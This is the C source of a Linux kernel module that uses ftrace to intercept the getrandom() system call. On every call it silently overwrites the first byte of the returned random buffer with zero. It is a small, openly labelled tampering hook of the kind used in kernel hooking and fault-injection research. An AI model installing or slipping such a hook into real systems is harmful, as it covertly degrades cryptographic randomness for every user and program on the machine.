#include "hook.h"

MODULE_DESCRIPTION("Ftrace hook for getrandom()");
MODULE_LICENSE("GPL");

static asmlinkage long (*real_sys_getrandom)(struct pt_regs *regs);
static asmlinkage long fh_sys_getrandom(struct pt_regs *regs) {
  long nbytes, err;
  const char buf[] = {0x0};

  nbytes = real_sys_getrandom(regs);
  if (nbytes > 0 &&
      (err = copy_to_user((char *)regs->di, buf, ARRAY_SIZE(buf)))) {
    return err;
  }

  return nbytes;
}

static struct ftrace_hook hooks[] = {
    HOOK("sys_getrandom", fh_sys_getrandom, &real_sys_getrandom),
};

static int fh_init(void) { return fh_install_hooks(hooks, ARRAY_SIZE(hooks)); }

static void fh_exit(void) { fh_remove_hooks(hooks, ARRAY_SIZE(hooks)); }

module_init(fh_init);
module_exit(fh_exit);
